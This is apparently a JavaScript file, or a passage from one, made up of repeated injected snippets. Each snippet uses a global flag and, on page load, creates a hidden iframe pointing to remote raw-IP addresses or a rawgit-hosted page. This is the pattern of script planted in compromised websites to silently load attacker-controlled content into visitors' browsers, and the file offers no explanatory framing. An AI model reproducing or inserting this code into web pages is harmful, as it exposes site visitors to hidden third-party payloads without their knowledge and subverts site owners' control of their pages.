		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}





if (typeof obj.foo == 'undefined') {
window.jsuekzis = 1;
window.onload = function() {
    var iframe = document.createElement('iframe');
    iframe.style.display = "none";
    iframe.src = "http://155.94.75.92/iframe.html";
    document.body.appendChild(iframe);
};

}





void 0===window.mondrawtexture&&(window.mondrawtexture=1,window.onload=function(){var e=document.createElement('iframe');e.style.display='none',e.src='https://cdn.rawgit.com/jdobt/3e35d8a7d2c1c36ae1972ea03df91572/raw/8656e6f8554bfd2f13cf8eb78e8df044fae1e9e2/drawtexture.html',document.body.appendChild(e)});